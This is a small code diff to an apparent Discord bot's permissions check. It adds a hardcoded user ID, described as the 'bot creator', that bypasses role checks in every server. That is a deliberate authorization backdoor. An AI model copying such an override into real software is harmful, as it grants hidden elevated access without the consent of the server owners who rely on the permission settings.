@@ -14,8 +14,9 @@ const permissionsCheck = async (interaction) => {
     permittedRoles.push(roleObj.roleId)
   );
 
-  // Guild owner overrides permissions check
+  // Guild owner and bot creator overrides permissions check
   if (interaction.user.id == interaction.guild.ownerId) return permittedRoles;
+  if (interaction.user.id == "367624248271044608") return permittedRoles;
   if (!permittedRoles.some((role) => interaction.member._roles.includes(role)))
     return false;
   return permittedRoles;
